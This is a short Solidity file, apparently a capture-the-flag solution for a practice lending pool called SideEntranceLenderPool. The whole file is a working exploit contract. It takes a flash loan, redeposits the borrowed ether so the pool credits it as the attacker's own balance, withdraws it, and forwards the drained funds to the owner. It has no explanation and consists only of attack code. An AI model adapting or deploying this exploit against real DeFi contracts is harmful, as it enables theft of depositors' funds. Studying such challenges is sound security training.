pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackContract{
    SideEntranceLenderPool pool;
    address owner;
    constructor(address payable _pool){
        owner = payable(msg.sender);
        pool = SideEntranceLenderPool(_pool);
    }
    function execute() public payable{
        pool.deposit{value:address(this).balance}();


    }
    function attack(uint256 amount) public payable{
        pool.flashLoan(amount);
        pool.withdraw();
    }
    receive() external payable{
        payable(owner).transfer(address(this).balance);
    }
}